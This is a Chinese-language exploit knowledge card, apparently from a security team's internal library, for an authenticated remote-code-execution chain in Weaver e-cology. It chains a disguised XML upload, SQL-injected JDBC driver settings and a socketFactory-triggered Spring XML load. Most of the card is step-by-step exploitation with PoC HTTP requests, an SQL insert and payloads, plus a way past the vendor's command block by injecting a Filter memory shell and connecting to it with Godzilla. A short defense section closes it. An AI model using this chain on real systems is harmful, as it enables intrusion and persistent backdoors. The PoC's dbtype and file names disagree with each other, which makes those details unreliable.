---
id: web-java-component-weaver-ecology-jdbc-socketfactory-memshell
title: 泛微 e-cology 后台 JDBC socketFactory 加载上传 XML 注入内存马：materialLib 上传 + datasource 测试链
type: scenario
domain: web
path: web/java/component
technique: weaver-ecology-jdbc-socketfactory-xml-memshell
aliases:
- 泛微 JDBC RCE
- 泛微后台 RCE
- highgo socketFactory
- ClassPathXmlApplicationContext 加载 XML
- materialLib uploadFile
- datasource_type 驱动注入
- 泛微内存马注入
- XMLDecoder 内存马
tags:
- java
- weaver
- ecology
- jdbc
- socketfactory
- file-upload
- spring
- xmldecoder
- memshell
- rce
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:27:16+08:00'
  notes: 已对照原文及16张图核对：materialLib uploadFile落盘userfile(bg2025/bg2150)、datasource_type注入highgo driver、ExternalDataSourceManager.getConnectionParam查询driverclass/driverurl、BaseDataSource.testDataSource的DriverManager.getConnection、ProcessBuilder bean被[security reject]cmd执行不允许拦截、Jmg Filter内存马与Godzilla连接Success均与原文一致。问题：1) 卡内datasource_type插入的dbtype为sqlserver20011273983190，但触发请求type=sqlserver20011273983191，两处不一致，照抄PoC会查不到驱动，需统一；2) 上传示例文件名bg2025.jpg，而driverurl/socketFactoryArg指向bg2150.jpg，需改为实际上传文件路径或说明为两次载荷；3) 原文未给泛微版本，未设affected_versions；未本机复跑。修正上述两点后可转verified。
---

## 一句话结论

泛微 e-cology 后台可先通过 `/api/portal/materialLib/uploadFile` 把 Spring XML/XMLDecoder 载荷以 `.jpg` 文件名上传到 Web 可访问的 `page/resource/userfile` 目录，再向 `datasource_type` 写入 `driverclass=com.highgo.jdbc.Driver`、`driverurl` 含 `socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file:///<上传文件>` 的恶意数据源类型，最后调用 `/api/integration/datasource/update`（`operate=test`）触发 `DriverManager.getConnection`；高go 驱动实例化 socketFactory，Spring 解析攻击者 XML 并执行 bean 初始化。直接 `ProcessBuilder` 执行 cmd 会被泛微安全机制拦截（`[security reject]cmd执行不允许`），但改用 XMLDecoder/Jmg 生成的内存马载荷可成功注入 Filter 内存马，原文 Godzilla 连接成功。

## 原理

- **上传落点**：`POST /api/portal/materialLib/uploadFile` 接收 multipart `file` 字段，原文文件名 `bg2025.jpg`、`Content-Type: text/plain`、正文为 XML；文件落到 `C:/WEAVER/ecology/page/resource/userfile/`（Web 可访问目录）。仅按文件名/Content-Type 存储，未校验内容是图片还是 XML，`.jpg` 后缀也避开了脚本/XML 类上传限制。
- **数据源类型注入**：`datasource_type` 表保存 `dbtype/dbname/driverclass/driverurl`。原文通过后台 SQL 注入（见关联卡）插入：

  ```sql
  insert into datasource_type(dbtype, dbname, driverclass, driverurl)
  values ('sqlserver20011273983190','sqlserver2001','com.highgo.jdbc.Driver',
  'jdbc:highgo://10.1.9.7:11/test?user=test&password=password&host=org.springframework.context.support.ClassPathXmlApplicationContext&port=[servicename]/[servicename]/[servicename]/C:/WEAVER/ecology/page/resource/userfile/bg2150.jpg');
  ```

- **连接参数拼接**：`ExternalDataSourceManager.getConnectionParam` 执行 `select driverclass, driverurl from datasource_type where dbtype = '<type>'`，再把 `driverurl` 中的 `[host]`、`[port]`、`[servicename]` 用数据源配置字段替换。原文把数据源 `a12` 的“服务器IP”填成 `?socketFactory`，使 `[host]` 被替换后形成 `jdbc:highgo:///?socketFactory=...`。
- **触发与加载**：`/api/integration/datasource/update` 的 `operate=test` 进入 `BaseDataSource.testDataSource()`：`DriverManager.registerDriver(new com.highgo.jdbc.Driver())` → `DriverManager.getConnection(driverUrl, user, password)`。highgo 驱动基于 PostgreSQL，JDBC URL 的 `socketFactory` 属性允许指定任意 `SocketFactory` 实现类；传入 `org.springframework.context.support.ClassPathXmlApplicationContext` 后，驱动会实例化它并把 `socketFactoryArg`（`file:///...bg2150.jpg`）作为 XML 配置位置传入，Spring 解析该 XML、创建 bean 并执行 `init-method`。
- **为什么能成链**：上传提供“攻击者可控文件 + 固定本地路径”，数据库配置提供“攻击者可控 JDBC URL”，数据源测试提供“服务端主动连接”的触发点；三者组合后，JDBC 属性注入变成 Spring bean 实例化，进而任意代码/类加载。
- **安全机制的边界**：原文尝试 `java.lang.ProcessBuilder` bean（`init-method=start`，参数 `calc.exe`），在 bean 创建阶段被泛微安全模块拦截：

  ```text
  RuntimeException: [security reject]cmd执行不允许, url=/api/integration/datasource/update cmd=calc.exe
  ```

  说明直接命令执行被拦，但 bean 实例化/类加载路径仍可用。
- **内存马路径**：改用 XMLDecoder 反序列化载荷：bean `java.beans.XMLDecoder` + `ByteArrayInputStream` + Base64 的 Java 序列化数据；`XMLJdkDefineClass` 通过 `ClassLoader.defineClass` 加载攻击者字节码。字节码由 java-memshell-generator（Godzilla/Resin/Filter）生成，再用 Java Chains 的 `XMLDecoderPayload`（`JmgGadget`，需两层封装）组合，最终 `defineClass` + `newInstance` 注册 Filter 内存马；原文 Godzilla 连接 `http://<target>/123`（密码 `pass`、密钥 `key`、`JAVA_AES_BASE64_PT`）提示 Success。

## 触发条件

- 目标为泛微 e-cology（原文环境），攻击者拥有后台管理员会话（`ecology_JSessionid`/`JSESSIONID`/`loginidweaver=1`）。
- `/api/portal/materialLib/uploadFile` 可上传文件并落盘到 `page/resource/userfile`（或可预测的 Web 可访问目录）。
- 可写入/篡改 `datasource_type`（通过移动应用设计器 SQL 注入或后台数据源管理）。
- `/api/integration/datasource/update` 可访问且 `operate=test` 会实际建立 JDBC 连接。
- 目标 classpath 存在 `com.highgo.jdbc.Driver`（泛微自带 highgo 驱动）及 Spring；安全模块未完全禁止 socketFactory/bean 实例化（仅拦截 cmd）。
- 上传文件路径可由 `socketFactoryArg` 以 `file:///` 访问，且 XML 内容可控。

## 利用步骤

1. 登录后台，准备 XML 载荷（Spring bean 版或 XMLDecoder 版），通过 `/api/portal/materialLib/uploadFile` 以 `filename=bg2025.jpg`、`Content-Type: text/plain` 上传到 userfile 目录。
2. 记录服务端落盘绝对路径（原文 `C:/WEAVER/ecology/page/resource/userfile/bg2025.jpg`）。
3. 向 `datasource_type` 插入恶意驱动类型：`driverclass=com.highgo.jdbc.Driver`，`driverurl=jdbc:highgo:///[host]:[port]/[dbname]?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file:///<上传路径>`。
4. 在“数据源设置”新建数据源（如 `a12`），类型选刚插入的 dbtype，服务器IP 填 `?socketFactory`，端口/库名/用户名/密码随意填，保存。
5. 调用 `/api/integration/datasource/update`：`pointid=a12&type=<dbtype>&operate=test`，触发 `testDataSource()`；观察响应/错误。
6. 若用 ProcessBuilder bean，预期被安全机制拦截（`[security reject]cmd执行不允许`）；改用 XMLDecoder/Jmg 内存马载荷，重复上传/触发。
7. 用 Godzilla 连接内存马路径（原文 `/123`，pass/key 按生成配置），确认连接成功；注意清理上传文件与恶意数据源类型。

## PoC

上传 XML（原文 multipart 节选；XMLDecoder 版正文为超长 Base64，此处保留外层结构）：

```http
POST /api/portal/materialLib/uploadFile HTTP/1.1
Host: target
Cookie: ecology_JSessionid=<...>; JSESSIONID=<...>; loginidweaver=1; ...
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="bg2025.jpg"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN"
"http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
  <bean id="rce" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list><value>calc.exe</value></list>
    </constructor-arg>
  </bean>
</beans>
------X--
```

恶意数据源类型（原文通过 SQL 注入插入）：

```sql
insert into datasource_type(dbtype, dbname, driverclass, driverurl)
values (
  'sqlserver20011273983190', 'sqlserver2001', 'com.highgo.jdbc.Driver',
  'jdbc:highgo://10.1.9.7:11/test?user=test&password=password&host=org.springframework.context.support.ClassPathXmlApplicationContext&port=[servicename]/[servicename]/[servicename]/C:/WEAVER/ecology/page/resource/userfile/bg2150.jpg'
);
```

触发数据源测试：

```http
POST /api/integration/datasource/update HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Cookie: ecology_JSessionid=<...>; JSESSIONID=<...>; loginidweaver=1; ...

pointid=a12&type=sqlserver20011273983191&iscluster=1&host=%3FsocketFactory&port=123&dbname=1&url=&username=2&password=<...>&usepool=1&minconn=5&maxconn=10&sortid=5&id=7&operate=test&
```

内存马生成（原文工具链）：

```text
java-memshell-generator 1.0.9_250101：
  工具类型 Godzilla / 中间件 Resin / 组件 Filter / 输出 Base64
  密码 pass / 密钥 key / 请求头 Referer Tjzqkwec / 请求路径 /
Java Chains → Generate → XMLDecoderPayload：
  XMLJdkDefineClass + BytecodeConvert + JmgGadget，Base64 输出
```

Godzilla 连接：URL `http://target/123`，密码 `pass`，密钥 `key`，载荷 `JavaDynamicPayload`，加密器 `JAVA_AES_BASE64_PT`，提示 `Success!`。

## 变体与关联

- **不同 socketFactory 类**：任何可被 JDBC 驱动实例化的类都可尝试；Spring `ClassPathXmlApplicationContext` 只是把“类实例化”升级为“XML bean 定义执行”。
- **不同驱动**：PostgreSQL/highgo 的 socketFactory 链最典型；其他 JDBC 驱动若支持类似属性（socketFactory、socketFactoryArg、URL 参数指定类名）也可复用。
- **不同上传入口**：任何能写入 Web 可访问目录且内容可控的接口都可替代 materialLib（jpg 后缀/文本内容校验薄弱）。
- **安全机制对抗**：直接 cmd 被拦后，改用内存马/类加载/XMLDecoder 等不经过命令执行 API 的路径；原文 Godzilla 内存马即为成功案例。
- **关联卡片**：[[web-generic-sqli-weaver-mobilemode-runsql-datasource-bypass]]（本链前置的数据源类型写入）、[[web-java-deser-fastjson-postgres-pgconnection-xml-rce]]（Fastjson 触发 PgConnection socketFactory 加载远程 Spring XML，同一 JDBC 属性注入原语）、[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（JDBC URL 反序列化）。

## 检测与防御

- **上传**：`materialLib` 等上传接口做内容与扩展双重校验，禁止 `text/plain`/XML 内容伪装为图片；上传目录禁止被服务端解析为配置/脚本；文件名随机化并记录哈希。
- **数据源配置**：`datasource_type` 表只允许受控后台流程写入，禁止任意 `driverclass`/`driverurl`；对 JDBC URL 做白名单，拒绝 `socketFactory`、`socketFactoryArg`、`autoDeserialize`、`init` 等危险属性；数据源测试接口仅管理员可用并审计。
- **代码**：`ExternalDataSourceManager` 对 driverurl 的 `[host]` 替换应做 URL 解析与属性白名单；`BaseDataSource.testDataSource` 加载驱动前校验类名与 URL。
- **安全模块**：泛微安全机制已能拦截 cmd，但仍应封堵 bean 实例化/类加载/XMLDecoder；升级官方补丁。
- **检测**：上传 `.jpg` 但内容以 `<?xml`/`PK`/Base64 开头；`datasource_type` 出现 `com.highgo.jdbc.Driver` + `socketFactory`/`ClassPathXmlApplicationContext`；`/api/integration/datasource/update` 的 `operate=test` 伴随异常/安全拦截日志；`page/resource/userfile` 出现非图片文件；JVM 中出现无对应 class 文件的 Filter/Listener 内存马（可用 java-memshell-scanner/arthas 排查）。
- **应急**：删除恶意数据源类型与上传文件，重启应用清除内存马，排查 SQL 注入入口与后台账号。
